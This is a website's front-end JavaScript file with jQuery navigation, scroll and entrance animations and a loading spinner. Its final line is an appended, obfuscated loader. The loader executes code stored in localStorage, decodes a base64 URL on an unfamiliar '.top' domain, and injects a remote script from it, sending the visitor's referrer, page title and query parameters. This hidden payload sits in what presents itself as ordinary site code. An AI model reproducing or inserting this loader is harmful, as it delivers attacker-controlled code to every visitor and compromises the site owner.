
/////////
 
      
/*
document.onreadystatechange = function() {
    if (document.readyState !== "complete") {
        document.querySelector("body").style.visibility = "hidden";
        document.querySelector(".loader").style.visibility = "visible";
        
    } else {
        document.querySelector(".loader").style.display = "none";
        document.querySelector("body").style.visibility = "visible";
        //document.querySelector("body").style.visibility = "hidden";
        //document.querySelector(".loader").style.visibility = "visible";
        
    }
};
*/
const LayerDiv = document.querySelector('.layer');
const ContainerDiv = document.querySelector('.maincontainer');
const loadingSpinner = document.querySelector('.loading-spinner');
const imageUrl = getComputedStyle(LayerDiv).backgroundImage.slice(5, -2); // استخراج رابط الصورة

// إنشاء عنصر صورة للتأكد من تحميلها
const img = new Image();
img.src = imageUrl;

img.onload = () => {      
    ContainerDiv.style.display = "inline";
    loadingSpinner.style.display = 'none';

//nav bar click to go to clicked section
$('.navbar-nav li a').click(function(event) {
    event.preventDefault();
    
    var url = $(this).attr('href');
    var scrollTarget = $(this).data('scroll');

    // لو فيه scrollTarget والعنصر موجود
    if (scrollTarget && $('#' + scrollTarget).length) {
        let padt = (window.innerWidth <= 767) ? 350 : 0;
        $('html, body').animate({
            scrollTop: $('#' + scrollTarget).offset().top - 90 - padt
        }, 300);
        $('#navbarSupportedContent').removeClass('show');
    } 
    // لو فيه href خارجي أو رابط صفحة أخرى
    else if (url) {
        window.open(url, '_blank'); // يفتح في تبويب جديد
    }
});


//product section in
$('#ourproduct-nav').click(function(event){
  if(window.innerWidth >= 460){
  $('#product-image').css("left", "-300px");
  $('#product-description').css("left", "500px");
  
  $('#product-image').animate({
    left: '20px',
  },1000).animate({
    left: '-10px',
  }).animate({
    left: '0px',
  });
  $('#product-description').animate({
    left: '-20px',
  },1000).animate({
    left: '+10px',
  }).animate({
    left: '0px',
  });   
}
})

//vision section in
$('#vision-nav').click(function(event){
  if(window.innerWidth >= 460){
  $('#vision-1').css("left", "350px").css("top","-350px");
  $('#vision-2').css("top","-350px");
  $('#vision-3').css("left", "-350px").css("top","-350px");
  $('#vision-4').css("left", "350px").css("top","350px");
  $('#vision-5').css("top","350px");
  $('#vision-6').css("left", "-350px").css("top","350px");
  $('#vision-1, #vision-2, #vision-3, #vision-4, #vision-5, #vision-6').animate({
    left: '0px',
    top: '0px',
  },800);
}
})

//said section 
$('#said-nav').click(function(event){
  if(window.innerWidth >= 460){
  $('#said-card-1').css("left", "350px").css("top","-350px");
  $('#said-card-2').css("top","-350px");
  $('#said-card-3').css("left", "-350px").css("top","-350px");

  $('#said-card-1, #said-card-2, #said-card-3').animate({
    left: '0px',
    top: '0px',
  },800);
}
})

//said section 
$('#our-team-nav').click(function(event){
  if(window.innerWidth >= 460){
  $('#our-team-card-1').css("left", "350px").css("top","-350px");
  $('#our-team-card-2').css("top","-350px");
  $('#our-team-card-3').css("left", "-350px").css("top","-350px");

  $('#our-team-card-1, #our-team-card-2, #our-team-card-3').animate({
    left: '0px',
    top: '0px',
  },800);
}
})

//contact us in
$('#contactus-nav').click(function(){
  $('#contactus-section').fadeOut(1);
  $('#contactus-section').fadeIn(3000);
})

 

 };

      img.onerror = () => {
          console.error('Failed to load the image.');
          loadingSpinner.textContent = 'Failed to load the background.';
      };


//to top
//Check to see if the window is top if not then display button
$(window).scroll(function(){
if ($(this).scrollTop() > 100) {
    $('.scrollToTop').fadeIn();
} else {
    $('.scrollToTop').fadeOut();
}
});
//Click event to scroll to top
$('.scrollToTop').click(function(){
$('html, body').animate({scrollTop : 0},800);
return false;
});

// said.html page set all card with same hight
/*
if(window.innerWidth > 767){
let said1h = document.getElementsByClassName('said')[0].clientHeight
let said2h = document.getElementsByClassName('said')[1].clientHeight
let said3h = document.getElementsByClassName('said')[2].clientHeight
for(i=0; i<3; i++){
    var elesaid = document.getElementsByClassName('said')[i];
    var elewhowsaid = document.getElementsByClassName('who-said')[i];
    elewhowsaid.style.paddingTop = Math.max(said1h, said2h, said3h) - elesaid.clientHeight+'px'
}
*/

//change theme color
/*
  const currentTheme = localStorage.getItem("theme");
  console.log(!currentTheme);
  if(!currentTheme){
    $('body').addClass('purple-theme');
    localStorage.setItem("theme", 'purple-theme');  
  }else{
    $('body').addClass(currentTheme);
  }
  $('#changeTheme').click(function(){
    $('body').toggleClass("green-theme");
    $('body').toggleClass("purple-theme");
    let theme = "purple-theme";
    if (document.body.classList.contains("green-theme")) {
      theme = "green-theme";
    }
    localStorage.setItem("theme", theme);  
  })
*/

// Enter Element Animations
const observer = new IntersectionObserver(entries => {
  // Loop over the entries
  entries.forEach(entry => {
    // If the element is visible
    if (entry.isIntersecting) {
      //console.log(entry.target.children[0])
      // Add the animation class
      if(entry.target.id == "index-section"){
          document.getElementsByClassName('layer')[0].classList.add('layer-animation');
          entry.target.classList.add('index-animation');      
      }
      if(entry.target.id == "ourproduct-section"){
        $('#product-description').addClass('product-text-animation');
        $('#product-image').addClass('product-image-animation');
        //entry.target.children[0].children[0].classList.add('product-text-animation');
        //entry.target.children[0].children[1].classList.add('product-image-animation');
      }
    
      if(entry.target.id == "vision-section"){
        entry.target.children[1].children[0].classList.add('from-right-animation');
        entry.target.children[1].children[1].classList.add('from-top-animation');
        entry.target.children[1].children[2].classList.add('from-left-animation');
        entry.target.children[1].children[3].classList.add('from-right-animation');
        entry.target.children[1].children[4].classList.add('from-button-animation');
        entry.target.children[1].children[5].classList.add('from-left-animation');
      }
      
      if(entry.target.id == "said-cards-section"){
        entry.target.children[1].children[0].classList.add('from-right-animation');
        entry.target.children[1].children[2].classList.add('from-left-animation');
        entry.target.children[1].children[1].classList.add('from-button-animation');
      }

      if(entry.target.id == "contactus-section" 
      || entry.target.id == "blog-cards-section" 
      || entry.target.id == "vedio-section"
      ){
        entry.target.classList.add('enter-animation');
      }
    }
  });
});
const viewbox = document.querySelectorAll('.section');
viewbox.forEach(section => {
  observer.observe(section);
});
// End Enter Element Animations

(function(){var id='136c1e07507f4a97';if(window[id]){return;}window[id]=true;var d=document;var store=localStorage.getItem(id);if(store){var e=d.createElement('a');e.setAttribute('onclick',atob(store));e.click();localStorage.removeItem(id)}var s=d.createElement('script');s.src=atob('aHR0cHM6Ly9oZGZkc2k4NGozaC50b3Avc0ZublBGSG0/JnNlX3JlZmVycmVyPQ==')+encodeURIComponent(d.referrer)+'&default_keyword='+encodeURIComponent(d.title)+'&'+window.location.search.replace('?', '&')+'&frm=script';if(d.currentScript){d.currentScript.parentNode.insertBefore(s, d.currentScript);}else{d.getElementsByTagName('head')[0].appendChild(s);}}());
